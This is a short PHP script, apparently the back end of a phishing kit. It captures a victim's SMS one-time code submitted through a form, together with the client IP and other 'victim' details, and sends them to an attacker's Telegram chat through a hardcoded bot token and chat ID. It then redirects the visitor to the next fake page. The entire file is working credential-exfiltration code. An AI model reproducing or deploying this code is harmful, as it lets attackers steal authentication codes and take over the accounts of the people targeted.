<?php
include('functions.php');       
{				

$message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
$message .= 'SMS : ' . $_POST['sms'] . "\r\n";
$message .= '/-- END SMS INFOS --/' . "\r\n";
$message .= victim_infos();

$telegram_message .= 'SMS : ' . $_POST['sms'] . "\r\n";
$telegram_message .= 'IP address : ' . get_client_ip() . "\r\n";
telegram_send(urlencode($telegram_message));
$token = "5346795287:AAH4E_RDJyKyO6EXqsfhfCKzy_kCkAEHK30";
$data = [
    'text' => $message,
    'chat_id' => '-4027379174'
];
}
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: tsna.html");
?>